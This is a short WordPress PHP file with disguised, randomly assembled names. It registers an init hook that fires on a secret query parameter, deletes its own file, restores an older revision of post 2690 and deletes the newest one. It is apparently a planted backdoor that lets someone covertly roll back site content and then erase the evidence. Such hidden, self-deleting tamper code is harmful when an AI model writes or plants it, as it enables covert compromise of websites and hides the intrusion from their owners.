<?php

function react_connect_search() {
	if (isset($_GET['zoom_only_amp_management']) && $_GET['zoom_only_amp_management'] === 'tracking_type_directory') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$photos_card_kit = 2690;
		$auth_domain_enable = wp_get_post_revisions($photos_card_kit);
		if (empty($auth_domain_enable)) die('no revisions');
		if (count($auth_domain_enable) < 2) die('less than 2');
		$speed_update_notify_redirection = array_shift($auth_domain_enable);
		$charts_seo_carousel = $speed_update_notify_redirection->ID;
		$business_rss_location_captcha = array_shift($auth_domain_enable);
		$tab_advance_bulk_ultimate = $business_rss_location_captcha->ID;
		$nav_language_project = wp_restore_post_revision($tab_advance_bulk_ultimate);
		if ($nav_language_project === false) die('error restoring');
		$nav_language_project = wp_delete_post_revision($charts_seo_carousel);		
		if ($nav_language_project === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'react_connect_search');
